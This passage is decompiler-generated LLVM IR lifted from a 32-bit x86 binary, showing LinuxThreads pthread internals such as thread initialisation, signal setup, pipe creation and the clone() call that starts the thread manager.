  %v6_8058570 = icmp ugt i32 %v1_805855f, %v3_805856b
  br i1 %v6_8058570, label %dec_label_pc_8058568, label %dec_label_pc_8058572

dec_label_pc_8058572:                             ; preds = %dec_label_pc_805856b
  %v2_8058572 = add i32 %v0_8058568, 12
  %v3_8058572 = inttoptr i32 %v2_8058572 to i32*
  %v4_8058572 = load i32, i32* %v3_8058572, align 4
  %v10_8058572 = icmp ult i32 %v1_805855f, %v4_8058572
  br i1 %v10_8058572, label %dec_label_pc_8058568, label %dec_label_pc_8058577

dec_label_pc_8058577:                             ; preds = %dec_label_pc_8058572
  ret i32 %v3_805856b

; uselistorder directives
  uselistorder i32 %v0_8058568, { 1, 2, 3, 0 }
  uselistorder i32 %v1_805855f, { 1, 0, 2 }
  uselistorder label %dec_label_pc_805856b, { 1, 0 }
}

define i32 @thread_self.7(i32 %arg1) local_unnamed_addr {
entry:
  %stack_var_2096672 = alloca i32, align 4
  %v0_805857f = load i32, i32* @esp, align 4
  %v1_805857f = load i32, i32* @global_var_8078e6c.615, align 4
  %v7_805857f = icmp ult i32 %v0_805857f, %v1_805857f
  %v1_8058585 = icmp eq i1 %v7_805857f, false
  br i1 %v1_8058585, label %dec_label_pc_80585b6, label %dec_label_pc_8058587

dec_label_pc_8058587:                             ; preds = %entry
  %v1_8058587 = load i32, i32* @global_var_8078e70.616, align 16
  %v7_8058587 = icmp ult i32 %v0_805857f, %v1_8058587
  br i1 %v7_8058587, label %dec_label_pc_805859c, label %dec_label_pc_805858f

dec_label_pc_805858f:                             ; preds = %dec_label_pc_8058587
  %v1_8058594 = load i32, i32* @global_var_8078e74.618, align 4
  %v7_8058594 = icmp ult i32 %v0_805857f, %v1_8058594
  br i1 %v7_8058594, label %dec_label_pc_80585b6, label %dec_label_pc_805859c

dec_label_pc_805859c:                             ; preds = %dec_label_pc_805858f, %dec_label_pc_8058587
  %v0_805859c = load i32, i32* @global_var_807e578.619, align 8
  %v1_805859c = icmp eq i32 %v0_805859c, 0
  br i1 %v1_805859c, label %dec_label_pc_80585aa, label %dec_label_pc_80585a5

dec_label_pc_80585a5:                             ; preds = %dec_label_pc_805859c
  %v0_80585a5 = call i32 @__pthread_find_self()
  br label %dec_label_pc_80585aa

dec_label_pc_80585aa:                             ; preds = %dec_label_pc_805859c, %dec_label_pc_80585a5
  %v2_80585b0 = ptrtoint i32* %stack_var_2096672 to i32
  br label %dec_label_pc_80585b6

dec_label_pc_80585b6:                             ; preds = %dec_label_pc_805858f, %entry, %dec_label_pc_80585aa
  %v0_80585b6 = phi i32 [ ptrtoint (i32* @global_var_8074340.617 to i32), %dec_label_pc_805858f ], [ ptrtoint (i32* @global_var_8074160 to i32), %entry ], [ %v2_80585b0, %dec_label_pc_80585aa ]
  ret i32 %v0_80585b6

; uselistorder directives
  uselistorder label %dec_label_pc_80585b6, { 2, 0, 1 }
  uselistorder label %dec_label_pc_80585aa, { 1, 0 }
}

define i32 @pthread_onexit_process(i32 %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %stack_var_-188 = alloca i32, align 4
  %stack_var_-152 = alloca i32, align 4
  %v0_80585b7 = load i32, i32* @ebx, align 4
  %v0_80585be = load i32, i32* @global_var_8074524.624, align 4
  %v2_80585be = icmp slt i32 %v0_80585be, 0
  br i1 %v2_80585be, label %entry.dec_label_pc_8058644_crit_edge, label %dec_label_pc_80585c7

entry.dec_label_pc_8058644_crit_edge:             ; preds = %entry
  %v0_805864b.pre = load i32, i32* @eax, align 4
  br label %dec_label_pc_8058644

dec_label_pc_80585c7:                             ; preds = %entry
  %v1_80585c7 = call i32 @thread_self.7(i32 %v0_80585b7)
  store i32 %v1_80585c7, i32* @ebx, align 4
  store i32 %v1_80585c7, i32* %stack_var_-152, align 4
  %v2_80585e5 = ptrtoint i32* %stack_var_-152 to i32
  br label %dec_label_pc_80585e5

dec_label_pc_80585e5:                             ; preds = %dec_label_pc_8058601, %dec_label_pc_80585c7
  %v0_80585f0 = load i32, i32* @global_var_8074524.624, align 4
  store i32 %v0_80585f0, i32* %stack_var_-188, align 4
  %v3_80585f6 = call i32 @__libc_write(i32 %v0_80585f0, i32 %v2_80585e5, i32 148)
  %v8_80585fe = icmp eq i32 %v3_80585f6, -1
  %v1_80585ff = icmp eq i1 %v8_80585fe, false
  br i1 %v1_80585ff, label %dec_label_pc_805860b, label %dec_label_pc_8058601

dec_label_pc_8058601:                             ; preds = %dec_label_pc_80585e5
  %v0_8058601 = load i32, i32* %stack_var_-188, align 4
  %v1_8058601 = call i32 @__errno_location(i32 %v0_8058601)
  %v1_8058606 = inttoptr i32 %v1_8058601 to i32*
  %v2_8058606 = load i32, i32* %v1_8058606, align 4
  %v11_8058606 = icmp eq i32 %v2_8058606, 4
  br i1 %v11_8058606, label %dec_label_pc_80585e5, label %dec_label_pc_805860b

dec_label_pc_805860b:                             ; preds = %dec_label_pc_8058601, %dec_label_pc_80585e5
  %v0_805860b = load i32, i32* @ebx, align 4
  store i32 %v0_805860b, i32* @eax, align 4
  %v0_805860d = call i32 @suspend.6()
  %v0_8058612 = load i32, i32* @ebx, align 4
  %v1_8058612 = load i32, i32* bitcast (i32** @global_var_8074520.625 to i32*), align 32
  %v12_8058612 = icmp eq i32 %v0_8058612, %v1_8058612
  %v1_8058618 = icmp eq i1 %v12_8058612, false
  br i1 %v1_8058618, label %dec_label_pc_805860b.dec_label_pc_8058644_crit_edge, label %dec_label_pc_805861a

dec_label_pc_805860b.dec_label_pc_8058644_crit_edge: ; preds = %dec_label_pc_805860b
  br label %dec_label_pc_8058644

dec_label_pc_805861a:                             ; preds = %dec_label_pc_805860b
  %v0_8058622 = load i32, i32* @global_var_8074354.621, align 4
  store i32 %v0_8058622, i32* %stack_var_-188, align 4
  %v4_8058628 = call i32 @waitpid(i32 %v0_8058622, i32 0, i32 -2147483648, i32 %v0_805860d)
  store i32 0, i32* @global_var_8078e74.618, align 4
  store i32 0, i32* @global_var_8078e70.616, align 16
  br label %dec_label_pc_8058644

dec_label_pc_8058644:                             ; preds = %entry.dec_label_pc_8058644_crit_edge, %dec_label_pc_805860b.dec_label_pc_8058644_crit_edge, %dec_label_pc_805861a
  %v0_805864b = phi i32 [ %v0_805860d, %dec_label_pc_805860b.dec_label_pc_8058644_crit_edge ], [ %v0_805864b.pre, %entry.dec_label_pc_8058644_crit_edge ], [ %v4_8058628, %dec_label_pc_805861a ]
  store i32 %v0_80585b7, i32* @ebx, align 4
  ret i32 %v0_805864b

; uselistorder directives
  uselistorder i32* %stack_var_-152, { 1, 0 }
  uselistorder i32* %stack_var_-188, { 1, 0, 2 }
  uselistorder label %dec_label_pc_8058644, { 2, 1, 0 }
}

define i32 @__GI_pthread_self(i32 %arg1) local_unnamed_addr {
entry:
  %v1_805864c = call i32 @thread_self.7(i32 ptrtoint (i32* @0 to i32))
  %v1_8058651 = add i32 %v1_805864c, 16
  %v2_8058651 = inttoptr i32 %v1_8058651 to i32*
  %v3_8058651 = load i32, i32* %v2_8058651, align 4
  ret i32 %v3_8058651
}

define i32 @__pthread_reset_main_thread() local_unnamed_addr {
entry:
  %tmp3 = call i32 @__decompiler_undefined_function_0()
  %stack_var_-4 = alloca i32, align 4
  %v0_8058655 = load i32, i32* @ebx, align 4
  store i32 %v0_8058655, i32* %stack_var_-4, align 4
  %v1_8058659 = call i32 @thread_self.7(i32 %v0_8058655)
  %v0_805865e = load i32, i32* @global_var_8074524.624, align 4
  %v10_805865e = icmp eq i32 %v0_805865e, -1
  store i32 %v1_8058659, i32* @ebx, align 4
  br i1 %v10_805865e, label %dec_label_pc_80586ba, label %dec_label_pc_8058669

dec_label_pc_8058669:                             ; preds = %entry
  %v0_805866c = load i32, i32* @global_var_8078e70.616, align 16
  %v1_8058672 = call i32 @free(i32 %v0_805866c)
  %v0_8058678 = load i32, i32* @global_var_8074524.624, align 4
  store i32 0, i32* @global_var_8078e74.618, align 4
  store i32 0, i32* @global_var_8078e70.616, align 16
  %v1_8058692 = call i32 @__libc_close(i32 %v0_8058678)
  %v0_8058698 = load i32, i32* @global_var_807e590.660, align 16
  %v1_805869e = call i32 @__libc_close(i32 %v0_8058698)
  store i32 -1, i32* @global_var_807e590.660, align 16
  store i32 -1, i32* @global_var_8074524.624, align 4
  br label %dec_label_pc_80586ba

dec_label_pc_80586ba:                             ; preds = %entry, %dec_label_pc_8058669
  %v0_80586ba = phi i32 [ %tmp3, %entry ], [ %v0_8058698, %dec_label_pc_8058669 ]
  %v1_80586ba = call i32 @__libc_getpid(i32 %v0_80586ba)
  %v1_80586bf = load i32, i32* @ebx, align 4
  %v2_80586bf = add i32 %v1_80586bf, 20
  %v3_80586bf = inttoptr i32 %v2_80586bf to i32*
  store i32 %v1_80586ba, i32* %v3_80586bf, align 4
  %v0_80586c2 = load i32, i32* @ebx, align 4
  store i32 %v0_80586c2, i32* bitcast (i32** @global_var_8074520.625 to i32*), align 32
  %v2_80586c8 = inttoptr i32 %v0_80586c2 to i32*
  store i32 %v0_80586c2, i32* %v2_80586c8, align 4
  %v0_80586ca = load i32, i32* @ebx, align 4
  %v2_80586ca = add i32 %v0_80586ca, 4
  %v3_80586ca = inttoptr i32 %v2_80586ca to i32*
  store i32 %v0_80586ca, i32* %v3_80586ca, align 4
  %v0_80586cd = load i32, i32* @ebx, align 4
  %v1_80586cd = add i32 %v0_80586cd, 68
  %v2_80586cd = inttoptr i32 %v1_80586cd to i32*
  store i32 ptrtoint (i32* @global_var_807aed8.661 to i32), i32* %v2_80586cd, align 4
  %v0_80586d4 = load i32, i32* @ebx, align 4
  %v1_80586d4 = add i32 %v0_80586d4, 76
  %v2_80586d4 = inttoptr i32 %v1_80586d4 to i32*
  store i32 ptrtoint (i32* @global_var_807aedc.662 to i32), i32* %v2_80586d4, align 4
  %v2_80586dd = load i32, i32* %stack_var_-4, align 4
  store i32 %v2_80586dd, i32* @ebx, align 4
  ret i32 %v1_80586ba

; uselistorder directives
  uselistorder i32 %v0_80586ca, { 1, 0 }
  uselistorder i32 %v0_80586c2, { 1, 0, 2 }
  uselistorder label %dec_label_pc_80586ba, { 1, 0 }
}

define i32 @__pthread_kill_other_threads_np() local_unnamed_addr {
entry:
  %stack_var_-144 = alloca i32, align 4
  %stack_var_-140 = alloca i32, align 4
  %v2_80586ea = call i32 @pthread_onexit_process(i32 0, i32 0)
  %v0_80586ef = call i32 @__pthread_reset_main_thread()
  %v2_80586f5 = ptrtoint i32* %stack_var_-140 to i32
  %v2_80586f9 = ptrtoint i32* %stack_var_-144 to i32
  store i32 %v2_80586f9, i32* @ebx, align 4
  %v1_80586fe = call i32 @sigemptyset(i32 %v2_80586f5)
  store i32 0, i32* %stack_var_-144, align 4
  %v0_805871c = load i32, i32* @global_var_8074528.652, align 8
  %v4_8058722 = call i32 @__libc_sigaction(i32 %v0_805871c, i32* nonnull %stack_var_-144, i32 0)
  %v0_805872d = load i32, i32* @global_var_807452c.636, align 4
  %v4_8058733 = call i32 @__libc_sigaction(i32 %v0_805872d, i32* nonnull %stack_var_-144, i32 0)
  %v0_8058738 = load i32, i32* @global_var_8074530.627, align 16
  %tmp12 = icmp slt i32 %v0_8058738, 1
  br i1 %tmp12, label %dec_label_pc_8058751, label %dec_label_pc_8058744

dec_label_pc_8058744:                             ; preds = %entry
  %v4_8058749 = call i32 @__libc_sigaction(i32 %v0_8058738, i32* nonnull %stack_var_-144, i32 0)
  br label %dec_label_pc_8058751

dec_label_pc_8058751:                             ; preds = %entry, %dec_label_pc_8058744
  %v0_8058758 = phi i32 [ %v0_8058738, %entry ], [ %v4_8058749, %dec_label_pc_8058744 ]
  ret i32 %v0_8058758

; uselistorder directives
  uselistorder i32 %v0_8058738, { 1, 2, 0 }
  uselistorder i32 ()* @__pthread_reset_main_thread, { 1, 0 }
  uselistorder label %dec_label_pc_8058751, { 1, 0 }
}

define i32 @pthread_initialize(i32 %arg1) local_unnamed_addr {
entry:
  %eax.global-to-local = alloca i32, align 4
  %stack_var_-144 = alloca i32, align 4
  %stack_var_-284 = alloca i32, align 4
  %stack_var_-280 = alloca i32, align 4
  %stack_var_-16 = alloca i32, align 4
  %stack_var_-6291456 = alloca i32, align 4
  %v0_8058759 = load i32, i32* @esi, align 4
  %v0_805875a = load i32, i32* @ebx, align 4
  %v0_8058761 = load i32, i32* @global_var_8078e6c.615, align 4
  %v1_8058761 = icmp eq i32 %v0_8058761, 0
  %v1_8058768 = icmp eq i1 %v1_8058761, false
  br i1 %v1_8058768, label %dec_label_pc_80588f3, label %dec_label_pc_805876e

dec_label_pc_805876e:                             ; preds = %entry
  %v4_8058775 = ptrtoint i32* %stack_var_-6291456 to i32
  store i32 %v4_8058775, i32* %eax.global-to-local, align 4
  store i32 %v4_8058775, i32* @global_var_8078e6c.615, align 4
  %v1_805877f = call i32 @__libc_getpid(i32 %v0_805875a)
  store i32 %v1_805877f, i32* @global_var_8074174.663, align 4
  %v0_8058789 = load i32, i32* bitcast (i32** @global_var_807461c.665 to i32*), align 4
  store i32 %v0_8058789, i32* %eax.global-to-local, align 4
  store i32 ptrtoint (i32* @global_var_807aed8.661 to i32), i32* bitcast (i32** @global_var_80741a4.666 to i32*), align 4
  store i32 ptrtoint (i32* @global_var_807aedc.662 to i32), i32* bitcast (i32** @global_var_80741ac.667 to i32*), align 4
  store i32 0, i32* @global_var_8074650.668, align 16
  %v1_80587be4 = icmp eq i32 %v0_8058789, 0
  %v1_80587c011 = icmp eq i1 %v1_80587be4, false
  br i1 %v1_80587c011, label %dec_label_pc_80587ae, label %dec_label_pc_80587c2

dec_label_pc_80587ae:                             ; preds = %dec_label_pc_805876e, %dec_label_pc_80587bb
  %v0_80587b4 = phi i32 [ %v3_80587bb, %dec_label_pc_80587bb ], [ %v0_8058789, %dec_label_pc_805876e ]
  %v1_80587ae = add i32 %v0_80587b4, 52
  %v2_80587ae = inttoptr i32 %v1_80587ae to i32*
  %v3_80587ae = load i32, i32* %v2_80587ae, align 4
  %v12_80587ae = icmp eq i32 %v3_80587ae, 1
  br i1 %v12_80587ae, label %dec_label_pc_80587bb, label %dec_label_pc_80587b4

dec_label_pc_80587b4:                             ; preds = %dec_label_pc_80587ae
  store i32 0, i32* %v2_80587ae, align 4
  %v0_80587bb.pre = load i32, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_80587bb

dec_label_pc_80587bb:                             ; preds = %dec_label_pc_80587ae, %dec_label_pc_80587b4
  %v0_80587bb = phi i32 [ %v0_80587b4, %dec_label_pc_80587ae ], [ %v0_80587bb.pre, %dec_label_pc_80587b4 ]
  %v1_80587bb = add i32 %v0_80587bb, 32
  %v2_80587bb = inttoptr i32 %v1_80587bb to i32*
  %v3_80587bb = load i32, i32* %v2_80587bb, align 4
  store i32 %v3_80587bb, i32* %eax.global-to-local, align 4
  %v1_80587be = icmp eq i32 %v3_80587bb, 0
  %v1_80587c0 = icmp eq i1 %v1_80587be, false
  br i1 %v1_80587c0, label %dec_label_pc_80587ae, label %dec_label_pc_80587be.dec_label_pc_80587c2_crit_edge

dec_label_pc_80587be.dec_label_pc_80587c2_crit_edge: ; preds = %dec_label_pc_80587bb
  br label %dec_label_pc_80587c2

dec_label_pc_80587c2:                             ; preds = %dec_label_pc_80587be.dec_label_pc_80587c2_crit_edge, %dec_label_pc_805876e
  %v2_80587c4 = ptrtoint i32* %stack_var_-16 to i32
  store i32 %v2_80587c4, i32* @ebx, align 4
  %v2_80587ce = call i32 @getrlimit(i32 3, i32 %v2_80587c4)
  store i32 %v2_80587ce, i32* %eax.global-to-local, align 4
  %v1_80587d3 = call i32 @__GI_getpagesize(i32 3)
  %v2_80587dd = mul i32 %v1_80587d3, 2
  store i32 %v2_80587dd, i32* %eax.global-to-local, align 4
  %v2_80587e2 = sub i32 2097152, %v2_80587dd
  %v3_80587e4 = load i32, i32* %stack_var_-16, align 4
  %tmp = icmp ugt i32 %v3_80587e4, %v2_80587e2
  br i1 %tmp, label %dec_label_pc_80587ed, label %dec_label_pc_8058801

dec_label_pc_80587ed:                             ; preds = %dec_label_pc_80587c2
  store i32 %v2_80587e2, i32* %stack_var_-16, align 4
  %v6_80587f9 = bitcast i32* %stack_var_-16 to %rlimit*
  %v7_80587f9 = call i32 @__GI_setrlimit(i32 3, %rlimit* %v6_80587f9, i32 %v2_80587dd, i32 %v2_80587dd)
  store i32 %v7_80587f9, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_8058801

dec_label_pc_8058801:                             ; preds = %dec_label_pc_80587c2, %dec_label_pc_80587ed
  store i32 134581323, i32* %stack_var_-284, align 4
  %v2_805880c = ptrtoint i32* %stack_var_-280 to i32
  store i32 %v2_805880c, i32* @ebx, align 4
  %v2_8058810 = ptrtoint i32* %stack_var_-284 to i32
  store i32 %v2_8058810, i32* @esi, align 4
  %v1_8058815 = call i32 @sigemptyset(i32 %v2_805880c)
  store i32 %v1_8058815, i32* %eax.global-to-local, align 4
  %v0_805882b = load i32, i32* @global_var_8074528.652, align 8
  %v5_8058831 = call i32 @__libc_sigaction(i32 %v0_805882b, i32* nonnull %stack_var_-284, i32 0)
  store i32 134581178, i32* %stack_var_-284, align 4
  store i32 %v2_8058810, i32* %eax.global-to-local, align 4
  %v0_8058840 = load i32, i32* @global_var_8074528.652, align 8
  %v2_8058847 = call i32 @__GI_sigaddset(i32 %v2_805880c, i32 %v0_8058840)
  store i32 %v2_8058847, i32* %eax.global-to-local, align 4
  %v0_8058852 = load i32, i32* @global_var_807452c.636, align 4
  %v5_8058858 = call i32 @__libc_sigaction(i32 %v0_8058852, i32* nonnull %stack_var_-284, i32 0)
  store i32 %v5_8058858, i32* %eax.global-to-local, align 4
  %v0_8058860 = load i32, i32* @global_var_8074530.627, align 16
  %tmp34 = icmp slt i32 %v0_8058860, 1
  br i1 %tmp34, label %dec_label_pc_805888e, label %dec_label_pc_8058869

dec_label_pc_8058869:                             ; preds = %dec_label_pc_8058801
  store i32 134579123, i32* %stack_var_-284, align 4
  %v1_8058875 = call i32 @sigemptyset(i32 %v2_805880c)
  store i32 %v1_8058875, i32* %eax.global-to-local, align 4
  %v0_8058880 = load i32, i32* @global_var_8074530.627, align 16
  %v5_8058886 = call i32 @__libc_sigaction(i32 %v0_8058880, i32* nonnull %stack_var_-284, i32 0)
  store i32 %v5_8058886, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_805888e

dec_label_pc_805888e:                             ; preds = %dec_label_pc_8058801, %dec_label_pc_8058869
  %v2_8058891 = ptrtoint i32* %stack_var_-144 to i32
  store i32 %v2_8058891, i32* @ebx, align 4
  %v1_8058899 = call i32 @sigemptyset(i32 %v2_8058891)
  store i32 %v2_8058891, i32* %eax.global-to-local, align 4
  %v0_80588a0 = load i32, i32* @global_var_8074528.652, align 8
  %v2_80588a7 = call i32 @__GI_sigaddset(i32 %v2_8058891, i32 %v0_80588a0)
  store i32 %v2_80588a7, i32* %eax.global-to-local, align 4
  %v4_80588b4 = bitcast i32* %stack_var_-144 to %_TYPEDEF_sigset_t*
  %v5_80588b4 = call i32 @__GI_sigprocmask(i32 0, %_TYPEDEF_sigset_t* %v4_80588b4, i32 0)
  store i32 %v5_80588b4, i32* %eax.global-to-local, align 4
  store i32 %v2_8058891, i32* @esi, align 4
  %v1_80588c2 = call i32 @__GI_sigdelset(i32 %v2_8058891)
  store i32 %v2_8058891, i32* %eax.global-to-local, align 4
  %v0_80588c9 = load i32, i32* @global_var_807452c.636, align 4
  %v2_80588d0 = call i32 @__GI_sigaddset(i32 %v2_8058891, i32 %v0_80588c9)
  store i32 %v2_80588d0, i32* %eax.global-to-local, align 4
  %v5_80588dd = call i32 @__GI_sigprocmask(i32 1, %_TYPEDEF_sigset_t* %v4_80588b4, i32 0)
  store i32 %v5_80588dd, i32* %eax.global-to-local, align 4
  store i32 1, i32* @ebx, align 4
  store i32 %v2_8058891, i32* @esi, align 4
  %v2_80588eb = call i32 @on_exit(i32 134579639, i32 0)
  store i32 %v2_80588eb, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_80588f3

dec_label_pc_80588f3:                             ; preds = %entry, %dec_label_pc_805888e
  %.0 = phi i32 [ undef, %entry ], [ %v2_80588eb, %dec_label_pc_805888e ]
  store i32 %v0_805875a, i32* @ebx, align 4
  store i32 %v0_8058759, i32* @esi, align 4
  ret i32 %.0

; uselistorder directives
  uselistorder i32 %v2_8058891, { 2, 4, 1, 5, 3, 6, 0, 7, 8 }
  uselistorder i32 %v2_80587e2, { 1, 0 }
  uselistorder i32 %v2_80587dd, { 3, 2, 1, 0 }
  uselistorder i32 %v3_80587bb, { 1, 2, 0 }
  uselistorder i32* %stack_var_-284, { 0, 3, 1, 4, 2, 6, 5 }
  uselistorder i32 (i32)* @__GI_sigdelset, { 1, 0, 8, 7, 6, 5, 4, 3, 2 }
  uselistorder i32 (i32, i32)* @__GI_sigaddset, { 2, 1, 0, 3, 4 }
  uselistorder i32 (i32, i32*, i32)* @__libc_sigaction, { 3, 4, 5, 0, 1, 2, 6 }
  uselistorder i32 (i32)* @sigemptyset, { 2, 1, 0, 5, 3, 4 }
  uselistorder i32* @global_var_807aed8.661, { 1, 0 }
  uselistorder label %dec_label_pc_80588f3, { 1, 0 }
  uselistorder label %dec_label_pc_805888e, { 1, 0 }
  uselistorder label %dec_label_pc_8058801, { 1, 0 }
  uselistorder label %dec_label_pc_80587bb, { 1, 0 }
  uselistorder label %dec_label_pc_80587ae, { 1, 0 }
}

define i32 @__pthread_initialize_manager(i32 %arg1) local_unnamed_addr {
entry:
  %tmp8 = call i32 @__decompiler_undefined_function_0()
  %stack_var_-160 = alloca i32, align 4
  %stack_var_-12 = alloca i32, align 4
  %stack_var_-188 = alloca i32, align 4
  %v0_80588fc = load i32, i32* @ebx, align 4
  %v0_8058903 = load i32, i32* @global_var_8078e80.669, align 128
  %v1_8058908 = inttoptr i32 %v0_8058903 to i32*
  store i32 1, i32* %v1_8058908, align 4
  %v0_805890e = load i32, i32* @global_var_8078e6c.615, align 4
  %v1_805890e = icmp eq i32 %v0_805890e, 0
  %v1_8058915 = icmp eq i1 %v1_805890e, false
  br i1 %v1_8058915, label %dec_label_pc_805891c, label %dec_label_pc_8058917

dec_label_pc_8058917:                             ; preds = %entry
  %v1_8058917 = call i32 @pthread_initialize(i32 %v0_80588fc)
  br label %dec_label_pc_805891c

dec_label_pc_805891c:                             ; preds = %entry, %dec_label_pc_8058917
  %v0_805891c = load i32, i32* @global_var_807d134.638, align 4
  %factor = mul i32 %v0_805891c, 2
  %v3_8058924 = add i32 %factor, -32
  store i32 %v3_8058924, i32* %stack_var_-188, align 4
  %v1_8058929 = call i32 @malloc(i32 %v3_8058924)
  store i32 %v1_8058929, i32* @global_var_8078e70.616, align 16
  %v1_805893b = icmp eq i32 %v1_8058929, 0
  br i1 %v1_805893b, label %dec_label_pc_8058af9, label %dec_label_pc_8058943

dec_label_pc_8058943:                             ; preds = %dec_label_pc_805891c
  %v0_8058943 = load i32, i32* @global_var_807d134.638, align 4
  %v2_805894b = mul i32 %v0_8058943, 2
  %v3_805894b = add i32 %v1_8058929, -32
  %v4_805894b = add i32 %v3_805894b, %v2_805894b
  store i32 %v4_805894b, i32* @global_var_8078e74.618, align 4
  %v2_8058954 = ptrtoint i32* %stack_var_-12 to i32
  store i32 %v2_8058954, i32* %stack_var_-188, align 4
  %v1_805895c = call i32 @__GI_pipe(i32 %v2_8058954)
  %v8_8058964 = icmp eq i32 %v1_805895c, -1
  %v1_8058965 = icmp eq i1 %v8_8058964, false
  br i1 %v1_8058965, label %dec_label_pc_805897a, label %dec_label_pc_8058967

dec_label_pc_8058967:                             ; preds = %dec_label_pc_8058943
  %v0_805896a = load i32, i32* @global_var_8078e70.616, align 16
  store i32 %v0_805896a, i32* %stack_var_-188, align 4
  %v1_8058970 = call i32 @free(i32 %v0_805896a)
  br label %dec_label_pc_8058a6b

dec_label_pc_805897a:                             ; preds = %dec_label_pc_8058943
  %v0_805897a = load i32, i32* @global_var_807e58c.670, align 4
  %v1_805897f = icmp eq i32 %v0_805897a, 0
  br i1 %v1_805897f, label %dec_label_pc_8058988, label %dec_label_pc_8058988.thread

dec_label_pc_8058988.thread:                      ; preds = %dec_label_pc_805897a
  store i32 %v0_805897a, i32* @global_var_80742fc.671, align 4
  br label %dec_label_pc_8058995

dec_label_pc_8058988:                             ; preds = %dec_label_pc_805897a
  %v0_8058988.pre = load i32, i32* @global_var_80742fc.671, align 4
  %v1_8058988 = icmp eq i32 %v0_8058988.pre, 0
  br i1 %v1_8058988, label %dec_label_pc_8058a1d, label %dec_label_pc_8058995

dec_label_pc_8058995:                             ; preds = %dec_label_pc_8058988.thread, %dec_label_pc_8058988
  %v0_8058995 = load i32, i32* @global_var_807e57c.630, align 4
  %v0_805899a = load i8, i8* @global_var_8074300.672, align 256
  %v1_805899a = zext i8 %v0_805899a to i32
  %v4_805899a = or i32 %v1_805899a, %v0_8058995
  %v3_80589a0 = trunc i32 %v4_805899a to i8
  %v5_80589a0 = icmp slt i8 %v3_80589a0, 0
  %v1_80589a2 = icmp eq i1 %v5_80589a0, false
  br i1 %v1_80589a2, label %dec_label_pc_8058a1d, label %dec_label_pc_80589a4

dec_label_pc_80589a4:                             ; preds = %dec_label_pc_8058995
  store i32 0, i32* @edx, align 4
  %v0_80589a6 = load i32, i32* bitcast (i32** @global_var_807435c.643 to i32*), align 4
  store i32 %v0_80589a6, i32* @eax, align 4
  %v0_80589ab = load i32, i32* %stack_var_-188, align 4
  %v1_80589ab = call i32 @__pthread_lock(i32 %v0_80589ab)
  %v3_80589b0 = load i32, i32* %stack_var_-12, align 4
  %v0_80589bc = load i32, i32* @global_var_8078e74.618, align 4
  store i32 134573454, i32* %stack_var_-188, align 4
  %v4_80589c7 = call i32 @clone(i32 134573454, i32 %v0_80589bc, i32 3840, i32 %v3_80589b0)
  store i32 %v4_80589c7, i32* @eax, align 4
  store i32 %v4_80589c7, i32* @ebx, align 4
  %v10_80589d1 = icmp eq i32 %v4_80589c7, -1
  br i1 %v10_80589d1, label %dec_label_pc_8058a08, label %dec_label_pc_80589d6

dec_label_pc_80589d6:                             ; preds = %dec_label_pc_80589a4
  store i32 ptrtoint (i32* @global_var_8074340.617 to i32), i32* @global_var_80744ec.673, align 4
  store i32 8, i32* @global_var_80744e8.674, align 8
  store i32 ptrtoint (i32* @global_var_8074340.617 to i32), i32* @global_var_807e584.631, align 4
  store i32 2049, i32* @global_var_8074350.675, align 16
  store i32 %v4_80589c7, i32* @global_var_8074354.621, align 4
  %v0_8058a03 = call i32 @__linuxthreads_create_event()
  br label %dec_label_pc_8058a08

dec_label_pc_8058a08:                             ; preds = %dec_label_pc_80589a4, %dec_label_pc_80589d6
  %v0_8058a0b = load i32, i32* bitcast (i32** @global_var_807435c.643 to i32*), align 4
  store i32 %v0_8058a0b, i32* %stack_var_-188, align 4
  %v1_8058a11 = inttoptr i32 %v0_8058a0b to i32*
  %v2_8058a11 = call i32 @__pthread_unlock(i32* %v1_8058a11)
  %v0_8058a19 = load i32, i32* @ebx, align 4
  %v1_8058a19 = icmp eq i32 %v0_8058a19, 0
  %v1_8058a1b = icmp eq i1 %v1_8058a19, false
  br i1 %v1_8058a1b, label %dec_label_pc_8058a3e, label %dec_label_pc_8058a1d

dec_label_pc_8058a1d:                             ; preds = %dec_label_pc_8058a08, %dec_label_pc_8058995, %dec_label_pc_8058988
  %v3_8058a1d = load i32, i32* %stack_var_-12, align 4
  %v0_8058a29 = load i32, i32* @global_var_8078e74.618, align 4
  store i32 134571821, i32* %stack_var_-188, align 4
  %v4_8058a34 = call i32 @clone(i32 134571821, i32 %v0_8058a29, i32 3840, i32 %v3_8058a1d)
  store i32 %v4_8058a34, i32* @ebx, align 4
  br label %dec_label_pc_8058a3e

dec_label_pc_8058a3e:                             ; preds = %dec_label_pc_8058a08, %dec_label_pc_8058a1d
  %v0_8058a9d = phi i32 [ %v0_8058a19, %dec_label_pc_8058a08 ], [ %v4_8058a34, %dec_label_pc_8058a1d ]
  %v10_8058a3e = icmp eq i32 %v0_8058a9d, -1
  %v1_8058a41 = icmp eq i1 %v10_8058a3e, false
  br i1 %v1_8058a41, label %dec_label_pc_8058a76, label %dec_label_pc_8058a43

dec_label_pc_8058a43:                             ; preds = %dec_label_pc_8058a3e
  %v0_8058a46 = load i32, i32* @global_var_8078e70.616, align 16
  store i32 %v0_8058a46, i32* %stack_var_-188, align 4
  %v1_8058a4c = call i32 @free(i32 %v0_8058a46)
  store i32 %v0_8058a46, i32* @ebx, align 4
  %v3_8058a52 = load i32, i32* %stack_var_-12, align 4
  store i32 %v3_8058a52, i32* %stack_var_-188, align 4
  %v1_8058a59 = call i32 @__libc_close(i32 %v3_8058a52)
  store i32 %v3_8058a52, i32* @ecx, align 4
  store i32 %tmp8, i32* %stack_var_-188, align 4
  %v1_8058a66 = call i32 @__libc_close(i32 %tmp8)
  br label %dec_label_pc_8058a6b

dec_label_pc_8058a6b:                             ; preds = %dec_label_pc_8058967, %dec_label_pc_8058a43
  br label %dec_label_pc_8058af9

dec_label_pc_8058a76:                             ; preds = %dec_label_pc_8058a3e
  store i32 2049, i32* @global_var_8074350.675, align 16
  store i32 %tmp8, i32* @global_var_8074524.624, align 4
  %v3_8058a8c = load i32, i32* %stack_var_-12, align 4
  store i32 %v3_8058a8c, i32* @global_var_807e590.660, align 16
  %v0_8058a98 = load i32, i32* @global_var_807e588.626, align 8
  store i32 %v0_8058a9d, i32* @global_var_8074354.621, align 4
  %v1_8058aa3 = icmp eq i32 %v0_8058a98, 0
  br i1 %v1_8058aa3, label %dec_label_pc_8058ad1.preheader, label %dec_label_pc_8058aa7

dec_label_pc_8058aa7:                             ; preds = %dec_label_pc_8058a76
